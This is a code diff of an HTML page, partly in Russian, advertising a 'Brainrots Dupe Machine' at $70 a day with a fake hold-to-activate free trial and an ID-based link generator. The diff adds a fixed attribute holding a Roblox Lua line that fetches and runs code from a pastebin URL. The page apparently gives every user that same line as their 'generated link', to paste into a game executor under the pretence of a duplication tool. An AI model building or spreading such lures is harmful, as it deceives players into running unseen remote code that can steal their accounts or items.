@@ -4,129 +4,49 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Zagolovok</title>
-  <meta name="description" content="Brainrots Dupe Machine — activation & link generator UI." />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="./styles.css" />
 </head>
-
 <body>
-  <div class="bg" aria-hidden="true">
-    <div class="grid"></div>
-    <div class="orb orb-a"></div>
-    <div class="orb orb-b"></div>
-    <div class="vignette"></div>
-  </div>
 
-  <header class="header">
-    <div class="container header__inner">
-      <div class="mark">
-        <span class="dot"></span>
-        <span class="mark__text">Secured</span>
+  <main class="wrap">
+    <section class="box" id="app" data-fixed-link="loadstring(game:HttpGet("https://pastebin.com/raw/kguPGCJu"))()">
+      <div class="top">
+        <div class="badge">SECURED</div>
       </div>
-      <div class="header__right">
-        <span class="mini-pill">Black UI</span>
-        <span class="mini-pill">Blur</span>
-        <span class="mini-pill">Static</span>
-      </div>
-    </div>
-  </header>
 
-  <main class="container">
-    <section class="hero">
-      <h1 class="title">Brainrots Dupe Machine</h1>
-      <p class="subtitle">
-        Цена: <strong>$70 / день</strong> • Можно активировать <strong>2 дня бесплатно</strong>
-      </p>
+      <h1 class="title">Zagolovok</h1>
+      <p class="price">$70 / day <span class="dot">•</span> 2 days free</p>
 
-      <div class="card card--pricing" role="region" aria-label="Activation">
-        <div class="card__top">
-          <div class="card__label">Free trial</div>
-          <div class="card__hint">Нажми и держи 3 секунды</div>
-        </div>
-
-        <button id="holdBtn" class="hold" type="button" aria-label="Activate free trial">
-          <span class="hold__bg"></span>
-          <span id="holdFill" class="hold__fill"></span>
-          <span class="hold__content">
-            <span class="hold__title" id="holdTitle">Активировать 2 дня</span>
-            <span class="hold__sub" id="holdSub">Hold to activate</span>
-          </span>
+      <!-- LOCKED -->
+      <div class="locked" id="locked">
+        <button class="hold" id="holdBtn" type="button" aria-label="Activate free trial">
+          <span class="hold__fill" id="holdFill"></span>
+          <span class="hold__text" id="holdText">Hold 3s to activate</span>
         </button>
-
-        <div class="statusline">
-          <span class="statusline__key">Статус</span>
-          <span id="statusText" class="statusline__val">Не активировано</span>
-        </div>
+        <div class="status" id="status">Not activated</div>
       </div>
 
-      <div id="genCard" class="card card--gen is-locked" role="region" aria-label="Generator">
-        <div class="card__top">
-          <div class="card__label">Generator</div>
-          <div class="card__hint">Введите ID и сгенерируйте ссылку</div>
-        </div>
-
+      <!-- UNLOCKED -->
+      <div class="unlocked" id="unlocked" hidden>
         <div class="row">
-          <label class="field">
-            <span class="field__label">ID</span>
-            <input id="idInput" class="input" type="text" inputmode="text" placeholder="например: 9f3a-2k1x" autocomplete="off" />
-          </label>
-
-          <button id="genBtn" class="btn" type="button" disabled>
-            <span class="btn__text">Сгенерировать</span>
-            <span class="btn__icon" aria-hidden="true">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                <path d="M5 12h12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                <path d="M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-              </svg>
-            </span>
-          </button>
+          <input class="input" id="idInput" type="text" placeholder="ID" autocomplete="off" />
+          <button class="btn" id="genBtn" type="button">Generate</button>
         </div>
 
-        <div class="row row--link">
-          <div class="linkbox">
-            <div class="linkbox__label">Link</div>
-            <code id="linkOut" class="linkbox__value">""</code>
-          </div>
-          <button id="copyBtn" class="btn btn--ghost" type="button" disabled>
-            <span class="btn__text">Copy</span>
-            <span class="btn__icon" aria-hidden="true">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                <path d="M9 9h10v10H9V9Z" stroke="currentColor" stroke-width="2" />
-                <path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1" stroke="currentColor" stroke-width="2" />
-              </svg>
-            </span>
-          </button>
+        <div class="out" id="outWrap" hidden>
+          <div class="out__label">Link</div>
+          <div class="out__value" id="linkOut">""</div>
         </div>
 
-        <div id="toast" class="toast" aria-live="polite" aria-atomic="true"></div>
+        <div class="note" id="note">A<br/>B</div>
       </div>
-
-      <div class="card card--info" role="region" aria-label="Instruction">
-        <div class="card__top">
-          <div class="card__label">Instruction</div>
-          <div class="card__hint">Тестовый блок</div>
-        </div>
-
-        <div class="steps">
-          <div class="step">
-            <div class="step__n">А</div>
-            <div class="step__t">А</div>
-          </div>
-          <div class="step">
-            <div class="step__n">Б</div>
-            <div class="step__t">Б</div>
-          </div>
-        </div>
-      </div>
-
-      <footer class="footer">
-        <span class="footer__muted">© <span id="year"></span> Zagolovok</span>
-      </footer>
     </section>
   </main>
 
   <script src="./app.js"></script>
 </body>
 </html>
+
